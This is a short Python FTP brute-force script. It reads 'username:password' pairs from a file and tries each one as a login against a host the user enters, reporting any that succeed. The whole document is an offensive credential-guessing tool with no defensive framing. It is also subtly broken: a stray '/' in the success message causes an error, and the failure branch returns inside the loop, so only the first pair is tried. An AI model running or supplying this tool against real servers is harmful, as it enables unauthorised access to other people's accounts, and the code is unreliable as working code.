import ftplib
from socket import*

def brutelogin(hostip,password) :
      passfile=open(password,'r')
      for line in passfile.readlines() :
            user=line.split(':')[0]
            password=line.split(':')[1].strip('\r').strip('\n')
            print("[+] Trying " +user+ ':' +password)
            try :
                  ftp=ftplib.FTP(hostip)
                  ftp.login(user,password)
                  print("[+] " + str(hostip) + " login successful : " + user/ + password )
                  ftp.quit()
                  return (user,password)

            except Exception  :
                  pass
            print("[-] FTP login unsuccessful : Brute force attack failed. ")
            return (None,None)  



print("Enter the host name : ")
host=str(input())
hostip = gethostbyname(str(host))
print("Enter the path of password file having 'username:password' format")
password=str(input())

brutelogin(hostip,str(password))
